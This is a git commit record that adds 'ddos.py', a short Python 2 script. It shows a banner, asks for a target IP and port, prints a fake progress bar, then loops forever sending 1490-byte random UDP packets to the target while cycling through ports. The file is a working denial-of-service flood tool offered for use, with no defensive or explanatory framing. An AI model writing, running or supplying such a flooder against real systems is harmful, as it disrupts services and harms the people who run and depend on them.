a9c96b3a13a7b62e71fa6782e912165b5afe0d3c
GUL <63861452+3272226272@users.noreply.github.com>
2022-03-18 21:55:46 +0800

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,52 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet GU UP YYDS")
+print
+print "GU"
+print "DDOS"
+print "2773075041@QQ.COM"
+print "GU UP ----YYDS"
+print
+ip = raw_input("IP:")
+port = input("poart: ")
+
+os.system("clear")
+os.system("figlet GU UP YYDS")
+print "[         GU UP           ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
+
